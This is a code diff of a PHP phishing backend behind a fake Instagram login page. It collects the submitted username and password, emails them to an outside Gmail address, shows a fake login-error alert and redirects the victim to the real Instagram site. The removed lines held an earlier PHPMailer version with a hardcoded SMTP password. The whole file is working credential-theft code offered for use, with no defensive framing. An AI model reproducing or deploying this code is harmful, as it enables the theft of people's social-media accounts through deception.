@@ -1,37 +1,26 @@
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
+<?php
 
-require 'vendor/autoload.php'; // Assuming PHPMailer is installed via Composer
+// Variable settings
+$username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
+$passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
 
-$mail = new PHPMailer(true);
+$subject = "Someone Login ! Insta Dummy page";
+$to = "tenpmain@gmail.com";
 
-try {
-    // Server settings
-    $mail->isSMTP();
-    $mail->Host = 'smtp.example.com';
-    $mail->SMTPAuth = true;
-    $mail->Username = 'tenpmain@example.com';
-    $mail->Password = 'P8096796582@n';
-    $mail->SMTPSecure = 'tls';
-    $mail->Port = 587;
+$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;
 
-    // Recipients
-    $mail->setFrom('hackerhacked6699@example.com', 'Mailer');
-    $mail->addAddress($to);
+// Check input fields
+if (!empty($username) and !empty($passcode)) {
 
-    // Content
-    $mail->isHTML(false);
-    $mail->Subject = $subject;
-    $mail->Body    = $txt;
-
-    $mail->send();
-    echo "<script type='text/javascript'>
-        alert('Error! Unable to login.');
+    mail($to, $subject, $txt);
+    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
         window.location.replace('https://www.instagram.com');
-    </script>";
-} catch (Exception $e) {
-    echo "<script type='text/javascript'>
-        alert('Mailer Error: " . $mail->ErrorInfo . "');
+        </script>";
+
+} else {
+
+    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
         window.history.go(-1);
-    </script>";
+        </script>";
 }
+?>
